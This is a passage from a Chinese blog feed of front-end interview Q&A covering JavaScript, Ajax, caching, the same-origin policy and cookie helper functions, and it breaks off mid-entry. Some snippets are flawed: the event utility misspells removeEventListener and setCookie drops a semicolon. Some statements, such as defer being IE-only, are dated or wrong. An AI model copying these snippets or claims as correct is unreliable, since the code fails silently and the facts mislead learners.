demo</p><p><strong>YUI compressor：</strong><br>YUI Compressor 是一个用来压缩 JS 和 CSS 文件的工具，采用Java开发。<br>使用方法：<br>// 压缩JS<br> <code>java -jar yuicompressor-2.4.2.jar --type js --charset utf-8 -v src.js &gt; packed.js</code><br>// 压缩CSS<br> <code>java -jar yuicompressor-2.4.2.jar --type css --charset utf-8 -v src.css &gt; packed.css</code></p><p><strong>Google Closure Compiler：</strong><br><a href="https://developers.google.com/closure/compiler/" target="_blank" rel="external">官网：</a><br>使用方法：<br>1） 在命令行下使用一个google编译好的java程序<br>2） 使用google提供的在线服务<br>3） 使用google提供的RESTful API</p><blockquote><p>Flash、Ajax各自的优缺点，在使用中如何取舍？</p></blockquote><p>Flash：<br>1） Flash适合处理多媒体、矢量图形、访问机器<br>2） 对CSS、处理文本上不足，不容易被搜索</p><p>Ajax：<br>1） Ajax对CSS、文本支持很好，支持搜索<br>2） 多媒体、矢量图形、机器访问不足</p><p>共同点：<br>1） 与服务器的无刷新传递消息<br>2） 可以检测用户离线和在线状态<br>3） 操作DOM</p><blockquote><p>请解释一下 JavaScript 的同源策略。</p></blockquote><p>概念：<br>同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。<br>这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。</p><p>为什么要有同源限制：<br>我们举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。</p><blockquote><p>为什么要有同源限制？</p></blockquote><p>我们举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。</p><blockquote><p>什么是 “use strict”; ? 使用它的好处和坏处分别是什么？</p></blockquote><p>1) use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行,</p><p>2) 使JS编码更加规范化的模式,消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为。</p><p>3) 提高编译器效率，增加运行速度；</p><p>4) 为未来新版本的Javascript标准化做铺垫。</p><p>缺点：现在网站的 JS 都会进行压缩，一些文件用了严格模式，而另一些没有。这时这些本来是严格模式的文件，被 merge 后，这个串就到了文件的中间，不仅没有指示严格模式，反而在压缩后浪费了字节。</p><blockquote><p>GET和POST的区别，何时使用POST？</p></blockquote><p>GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符<br>POST：一般用于修改服务器上的资源，对所发送的信息没有限制</p><p>GET方式需要使用 Request.QueryString 来取得变量的值<br>POST方式通过 Request.Form 来获取变量的值<br>也就是说 Get 是通过地址栏来传值，而 Post 是通过提交表单来传值。</p><p>在以下情况中，请使用 POST 请求：<br>1)  无法使用缓存文件（更新服务器上的文件或数据库）<br>2)  向服务器发送大量数据（POST 没有数据量限制）<br>3)  发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</p><blockquote><p>哪些地方会出现css阻塞，哪些地方会出现js阻塞？</p></blockquote><p>js 的阻塞特性：所有浏览器在下载 JS 的时候，会阻止一切其他活动，比如其他资源的下载，内容的呈现等等。直到 JS 下载、解析、执行完毕后才开始继续并行下载其他资源并呈现内容。为了提高用户体验，新一代浏览器都支持并行下载 JS，但是 JS 下载仍然会阻塞其它资源的下载（例如.图片，css文件等）。<br>由于浏览器为了防止出现 JS 修改 DOM 树，需要重新构建 DOM 树的情况，所以就会阻塞其他的下载和呈现。<br>嵌入 JS 会阻塞所有内容的呈现，而外部 JS 只会阻塞其后内容的显示，2 种方式都会阻塞其后资源的下载。也就是说外部样式不会阻塞外部脚本的加载，但会阻塞外部脚本的执行。</p><p>CSS 怎么会阻塞加载了？CSS 本来是可以并行下载的，在什么情况下会出现阻塞加载了(在测试观察中，IE6 下 CSS 都是阻塞加载）<br>当 CSS 后面跟着嵌入的 JS 的时候，该 CSS 就会出现阻塞后面资源下载的情况。而当把嵌入 JS 放到 CSS 前面，就不会出现阻塞的情况了。<br>根本原因：因为浏览器会维持 html 中 css 和 js 的顺序，样式表必须在嵌入的 JS 执行前先加载、解析完。而嵌入的 JS 会阻塞后面的资源加载，所以就会出现上面 CSS 阻塞下载的情况。</p><p>嵌入JS应该放在什么位置？<br>1)  放在底部，虽然放在底部照样会阻塞所有呈现，但不会阻塞资源下载。<br>2)  如果嵌入JS放在head中，请把嵌入JS放在CSS头部。<br>3)  使用 defer（只支持IE）<br>4)  不要在嵌入的JS中调用运行时间较长的函数，如果一定要用，可以用 setTimeout 来调用</p><p>Javascript无阻塞加载具体方式：<br>1)  将脚本放在底部。<code>&lt;link&gt;</code>还是放在head中，用以保证在js加载前，能加载出正常显示的页面。<code>&lt;script&gt;</code>标签放在<code>&lt;/body&gt;</code>前。<br>2)  阻塞脚本：由于每个<code>&lt;script&gt;</code>标签下载时阻塞页面解析过程，所以限制页面的<code>&lt;script&gt;</code>总数也可以改善性能。适用于内联脚本和外部脚本。<br>3)  非阻塞脚本：等页面完成加载后，再加载js代码。也就是，在 <code>window.onload</code> 事件发出后开始下载代码。<br>4)  defer属性：支持IE4和fierfox3.5更高版本浏览器<br>5)  动态脚本元素：文档对象模型（DOM）允许你使用js动态创建HTML的几乎全部文档内容。代码如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="keyword">var</span> script=<span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</div><div class="line">    script.type=<span class="string">"text/javascript"</span>;</div><div class="line">    script.src=<span class="string">"file.js"</span>;</div><div class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>].appendChild(script);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><p>此技术的重点在于：无论在何处启动下载，文件额下载和运行都不会阻塞其他页面处理过程，即使在head里（除了用于下载文件的 http 链接）。</p><blockquote><p>eval是做什么的？</p></blockquote><p>1) 它的功能是把对应的字符串解析成JS代码并运行<br>2) 应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）</p><blockquote><p>写一个通用的事件侦听器函数</p></blockquote><p>// event(事件)工具集，<a href="github.com/markyun">来源：</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">markyun.Event = &#123;</div><div class="line">    <span class="comment">// 页面加载完成后</span></div><div class="line">    readyEvent : <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (fn==<span class="literal">null</span>) &#123;</div><div class="line">            fn=<span class="built_in">document</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</div><div class="line">            <span class="built_in">window</span>.onload = fn;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                oldonload();</div><div class="line">                fn();</div><div class="line">            &#125;;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></div><div class="line">    <span class="comment">// 参数： 操作的元素,事件名称 ,事件处理程序</span></div><div class="line">    addEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (element.addEventListener) &#123;</div><div class="line">            <span class="comment">//事件类型、需要执行的函数、是否捕捉</span></div><div class="line">            element.addEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</div><div class="line">            element.attachEvent(<span class="string">'on'</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                handler.call(element);</div><div class="line">            &#125;);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            element[<span class="string">'on'</span> + type] = handler;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 移除事件</span></div><div class="line">    removeEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (element.removeEnentListener) &#123;</div><div class="line">            element.removeEnentListener(type, handler, <span class="literal">false</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.detachEvent) &#123;</div><div class="line">            element.detachEvent(<span class="string">'on'</span> + type, handler);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            element[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;, </div><div class="line">    <span class="comment">// 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)</span></div><div class="line">    stopPropagation : <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (ev.stopPropagation) &#123;</div><div class="line">            ev.stopPropagation();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            ev.cancelBubble = <span class="literal">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 取消事件的默认行为</span></div><div class="line">    preventDefault : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (event.preventDefault) &#123;</div><div class="line">            event.preventDefault();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            event.returnValue = <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 获取事件目标</span></div><div class="line">    getTarget : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> event.target || event.srcElement;</div><div class="line">    &#125;,</div><div class="line">    <span class="comment">// 获取event对象的引用，取到事件的所有信息，确保随时能使用event；</span></div><div class="line">    getEvent : <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> ev = e || <span class="built_in">window</span>.event;</div><div class="line">        <span class="keyword">if</span> (!ev) &#123;</div><div class="line">            <span class="keyword">var</span> c = <span class="keyword">this</span>.getEvent.caller;</div><div class="line">            <span class="keyword">while</span> (c) &#123;</div><div class="line">                ev = c.arguments[<span class="number">0</span>];</div><div class="line">                <span class="keyword">if</span> (ev &amp;&amp; Event == ev.constructor) &#123;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">                c = c.caller;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> ev;</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><blockquote><p>Node.js 的适用场景</p></blockquote><p>1)  高并发<br>2)  聊天<br>3)  实时消息推送   </p><blockquote><p>JavaScript 原型，原型链 ? 有什么特点？</p></blockquote><p>1)  原型对象也是普通的对象，是对象一个自带隐式的 <code>__proto__</code>属性，原型也有可能有自己的原型，如果一个原型对象的原型不为 <code>null</code> 的话，我们就称之为原型链<br>2)  原型链是由一些用来继承和共享属性的对象组成的（有限的）对象链</p><blockquote><p>怎么重构页面？</p></blockquote><p>1) 编写 CSS<br>2) 让页面结构更合理化，提升用户体验<br>3) 实现良好的页面效果和提升性能</p><blockquote><p>WEB应用从服务器主动推送Data到客户端有那些方式？</p></blockquote><p>1)  html5 websocket<br>2)  WebSocket 通过 Flash<br>3)  XHR长时间连接<br>4)  XHR Multipart Streaming<br>5)  不可见的Iframe<br>6)  <code>&lt;script&gt;</code>标签的长时间连接(可跨域)</p><blockquote><p>事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？</p></blockquote><p>1)  我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为<br>2)  事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件<br>3)  <code>ev.stopPropagation();</code><br>注意旧ie的方法：<code>ev.cancelBubble = true;</code></p><blockquote><p>Ajax 是什么？Ajax 的交互模型？同步和异步的区别？如何解决跨域问题？</p></blockquote><p>Ajax 是什么：<br>1) 通过异步模式，提升了用户体验<br>2) 优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用<br>3) Ajax 在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。</p><p>Ajax 的最大的特点：<br>1) Ajax可以实现动态不刷新（局部刷新）<br>2) readyState 属性 状态 有5个可取值： 0 = 未初始化，1 = 启动， 2 = 发送，3 = 接收，4 = 完成</p><p>Ajax 同步和异步的区别:<br>1)  同步：提交请求 -&gt; 等待服务器处理 -&gt; 处理完毕返回，这个期间客户端浏览器不能干任何事<br>2)  异步：请求通过事件触发 -&gt; 服务器处理（这是浏览器仍然可以作其他事情）-&gt; 处理完毕<br>ajax.open方法中，第3个参数是设同步或者异步。</p><p>Ajax 的缺点：<br>1)  Ajax 不支持浏览器 back 按钮<br>3)  安全问题 Ajax 暴露了与服务器交互的细节<br>4)  对搜索引擎的支持比较弱<br>5)  破坏了程序的异常机制<br>6)  不容易调试</p><p>解决跨域问题：<br>1)  jsonp<br>2)  iframe<br>3)  window.name、window.postMessage<br>4)  服务器上设置代理页面</p><blockquote><p>js对象的深度克隆代码实现</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">Obj</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> buf;   </div><div class="line">    <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;</div><div class="line">        buf = [];  <span class="comment">// 创建一个空的数组</span></div><div class="line">        <span class="keyword">var</span> i = Obj.length;</div><div class="line">        <span class="keyword">while</span> (i--) &#123;</div><div class="line">            buf[i] = clone(Obj[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> buf;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Object</span>)&#123;</div><div class="line">        buf = &#123;&#125;;  <span class="comment">// 创建一个空对象</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> Obj) &#123;  <span class="comment">// 为这个对象添加新的属性</span></div><div class="line">            buf[k] = clone(Obj[k]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> buf;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> Obj;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p>对网站重构的理解</p></blockquote><p>网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变 UI 的情况下，对网站进行优化，在扩展的同时保持一致的 UI。</p><p>对于传统的网站来说重构通常是：<br>1)  表格(table)布局改为 DIV + CSS<br>2)  使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对 IE6 有效的)<br>3)  对于移动平台的优化<br>4)  针对于 SEO 进行优化<br>5)  深层次的网站重构应该考虑的方面<br>6)  减少代码间的耦合<br>7)  让代码保持弹性<br>8)  严格按规范编写代码<br>9)  设计可扩展的API<br>10)  代替旧有的框架、语言(如VB)<br>11)  增强用户体验<br>12)  通常来说对于速度的优化也包含在重构中<br>13)  压缩JS、CSS、image等前端资源(通常是由服务器来解决)<br>14)  程序的性能优化(如数据读写)<br>15)  采用CDN来加速资源加载<br>16)  对于JS DOM的优化<br>17)  HTTP服务器的文件缓存</p><blockquote><p>如何获取UA</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> </span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">whatBrowser</span>(<span class="params"></span>) </span>&#123;  </div><div class="line">    <span class="built_in">document</span>.Browser.Name.value=navigator.appName;  </div><div class="line">    <span class="built_in">document</span>.Browser.Version.value=navigator.appVersion;  </div><div class="line">    <span class="built_in">document</span>.Browser.Code.value=navigator.appCodeName;  </div><div class="line">    <span class="built_in">document</span>.Browser.Agent.value=navigator.userAgent;  </div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure><blockquote><p>js 数组去重</p></blockquote><p>用JavaScript脚本为Array对象添加一个去除重复项的方法</p><blockquote><p>cache-control</p></blockquote><p>网页的缓存是由HTTP消息头中的“Cache-control”来控制的，常见的取值有private、no-cache、max-age、must-revalidate等，默认为private。</p><p>Expires 头部字段提供一个日期和时间，响应在该日期和时间后被认为失效。允许客户端在这个时间之前不去检查（发请求），等同max-age的效果。但是如果同时存在，则被Cache-Control的max-age覆盖。</p><p>Expires = “Expires” “:” HTTP-date<br>例如：<br>Expires: Thu, 01 Dec 1994 16:00:00 GMT （必须是GMT格式）<br>如果把它设置为-1，则表示立即过期</p><p>Expires 和 max-age 都可以用来指定文档的过期时间，但是二者有一些细微差别<br>1)  Expires在HTTP/1.0中已经定义，Cache-Control:max-age在HTTP/1.1中才有定义，为了向下兼容，仅使用max-age不够<br>2)  Expires指定一个绝对的过期时间(GMT格式),这么做会导致至少2个问题：<br>    2.1客户端和服务器时间不同步导致Expires的配置出现问题。<br>    2.2很容易在配置后忘记具体的过期时间，导致过期来临出现浪涌现象<br>3)  max-age 指定的是从文档被访问后的存活时间，这个时间是个相对值(比如:3600s)，相对的是文档第一次被请求时服务器记录的Request_time(请求时间)<br>4)  Expires 指定的时间可以是相对文件的最后访问时间(Atime)或者修改时间(MTime)，而max-age相对对的是文档的请求时间(Atime)<br>5)  如果值为 no-cache,那么每次都会访问服务器。如果值为max-age，则在过期之前不会重复访问服务器。</p><blockquote><p>js 操作获取和设置 cookie</p></blockquote><p>// 创建cookie<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, expires, path, domain, secure</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> cookieText = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(value);</div><div class="line">    <span class="keyword">if</span> (expires <span class="keyword">instanceof</span> <span class="built_in">Date</span>) &#123;</div><div class="line">        cookieText += <span class="string">'; expires='</span> + expires;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (path) &#123;</div><div class="line">        cookieText += <span class="string">"; path="</span> + path     &#125;</div><div class="line">    <span class="keyword">if</span> (domain) &#123;</div><div class="line">        cookieText += <span class="string">'; domain='</span> + domain;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (secure) &#123;</div><div class="line">        cookieText += <span class="string">'; secure'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">document</span>.cookie = cookieText;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>// 获取cookie<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> cookieName = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span>;</div><div class="line">    <span class="keyword">var</span> cookieStart = <span class="built_in">document</span>.cookie.indexOf(cookieName);</div><div class="line">    <span class="keyword">var</span> cookieValue = <span class="literal">null</span>;</div><div class="line">    <span class="keyword">if</span> (cookieStart &gt; <span class="number">-1</span>) &#123;</div><div class="line">        <span class="keyword">var</span> cookieEnd = <span class="built_in">document</span>.cookie.indexOf(<span class="string">';'</span>, cookieStart);</div><div class="line">        <span class="keyword">if</span> (cookieEnd == <span class="number">-1</span>) &#123;</div><div class="line">            cookieEnd = <span class="built_in">document</span>.cookie.length;</div><div class="line">        &#125;</div><div class="line">        cookieValue = <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.cookie.substring(cookieStart + cookieName.length, cookieEnd));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> cookieValue;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 删除cookie</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">unsetCookie</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="built_in">document</span>.cookie = name + <span class="string">"= ; expires="</span> + <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><a href="https://www.nowcoder.com/ta/front-end-interview" target="_blank" rel="external">【牛客链接】</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;请你谈谈Cookie的弊端&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;优点&lt;/strong&gt;： 极高的扩展性和可用性&lt;br&gt;1) 数据持久性。&lt;br&gt;2) 不需要任何服务器资源。 Cookie 存储在客户端并在发送后由服务器读取。&lt;br&gt;3) 可配置到期规则。 控制 cookie 的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的 cookie 。&lt;br&gt;4) 简单性。 基于文本的轻量结构。&lt;br&gt;5) 通过良好的编程，控制保存在 cookie 中的 session 对象的大小。&lt;br&gt;6) 通过加密和安全传输技术（ SSL ），减少 cookie 被破解的可能性。&lt;br&gt;7) 只在 cookie 中存放不敏感数据，即使被盗也不会有重大损失。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Javascript 查漏补缺</title>
    <link href="wangsiyuan233.github.io/2018/07/11/59Javascript-%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/"/>
    <id>wangsiyuan233.github.io/2018/07/11/59Javascript-查漏补缺/</id>
    <published>2018-07-11T14:09:37.000Z</published>
    <updated>2018-07-16T17:09:24.180Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>（方方-必考）一、介绍js的基本数据类型。</p></blockquote><p><code>Undefined、Null、Boolean、Number、String、</code><br>ECMAScript 2015 新增:<code>Symbol</code> (创建后独一无二且不可变的数据类型 )<br>一旦出现（数组、函数、正则、日期、NaN）直接0分</p><blockquote><p>二、介绍js有哪些内置对象？</p></blockquote><p>Object 是 JavaScript 中所有对象的父对象</p><p>数据封装类对象：<code>Object、Array、Boolean、Number 和 String</code><br>其他对象：<code>Function、Arguments、Math、Date、RegExp、Error</code><br><a href="https://www.ibm.com/developerworks/cn/web/wa-objectsinjs-v1b/index.html" target="_blank" rel="external">了解 JavaScript 中的内置对象</a><br><a id="more"></a></p><blockquote><p>三、说几条写JavaScript的基本规范？</p></blockquote><p>（1）、不要在同一行声明多个变量。<br>（2）、请使用 ===/!==来比较true/false或者数值<br>（3）、使用对象字面量替代new Array这种形式<br>（4）、不要使用全局函数。<br>（5）、Switch语句必须带有default分支<br>（6）、函数不应该有时候有返回值，有时候没有返回值。<br>（7）、For循环必须使用大括号<br>（8）、If语句必须使用大括号<br>（9）、for-in 循环中的变量 应该使用 var关键字明确限定作用域，从而避免作用域污染。</p><blockquote><p>四、JavaScript原型，原型链 ? 有什么特点？</p></blockquote><p>每个对象都会在其内部初始化一个属性，就是prototype(原型)，当我们访问一个对象的属性时，<br>如果这个对象内部不存在这个属性，那么他就会去prototype里找这个属性，这个prototype又会有自己的prototype，<br>于是就这样一直找下去，也就是我们平时所说的原型链的概念。<br>关系：instance.constructor.prototype = instance.<strong>proto</strong></p><p>特点：JavaScript对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变。</p><p>当我们需要一个属性的时，Javascript引擎会先看当前对象中是否有这个属性， 如果没有的话，<br>就会查找他的Prototype对象是否有这个属性，如此递推下去，一直检索到 Object 内建对象。<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function <span class="function"><span class="keyword">Func</span><span class="params">()</span>&#123;&#125;</span></div><div class="line"><span class="function"><span class="keyword">Func</span>.<span class="title">prototype</span>.<span class="title">name</span> = "<span class="title">Sean</span>";</span></div><div class="line"><span class="function"><span class="keyword">Func</span>.<span class="title">prototype</span>.<span class="title">getInfo</span> = <span class="title">function</span><span class="params">()</span> &#123;</span></div><div class="line">  <span class="keyword">return</span> this.name<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">var person = new <span class="function"><span class="keyword">Func</span><span class="params">()</span>;//现在可以参考<span class="title">var</span> <span class="title">person</span> = <span class="title">Object</span>.<span class="title">create</span><span class="params">(oldObject)</span>;</span></div><div class="line">console.<span class="built_in">log</span>(person.getInfo())<span class="comment">;//它拥有了Func的属性和方法</span></div><div class="line">//<span class="string">"Sean"</span></div><div class="line">console.<span class="built_in">log</span>(<span class="function"><span class="keyword">Func</span>.<span class="title">prototype</span>);</span></div><div class="line">// <span class="function"><span class="keyword">Func</span> &#123; <span class="title">name</span>="<span class="title">Sean</span>", <span class="title">getInfo</span>=<span class="title">function</span><span class="params">()</span>&#125;</span></div></pre></td></tr></table></figure></p><blockquote><p>五、JavaScript有几种类型的值？，你能画一下他们的内存图吗？</p></blockquote><p>栈：原始数据类型（Undefined，Null，Boolean，Number、String）<br>堆：引用数据类型（对象、数组和函数）</p><p>两种类型的区别是：存储位置不同；<br>原始数据类型直接存储在栈(stack)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储；<br>引用数据类型存储在堆(heap)中的对象,占据空间大、大小不固定。如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体<br><img src="https://i.imgur.com/pJTweI7.gif" alt=""></p><blockquote><p>六、如何将字符串转化为数字，例如’12.3b’?</p></blockquote><p>（1）、<code>parseFloat(&#39;12.3b&#39;)</code>;<br>（2）、正则表达式，<code>&#39;12.3b&#39;.match(/(\d)+(\.)?(\d)+/g)[0] * 1</code>, 但是这个不太靠谱，提供一种思路而已。</p><blockquote><p>七、如何将浮点数点左边的数每三位添加一个逗号，如12000000.11转化为『12,000,000.11』?</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td 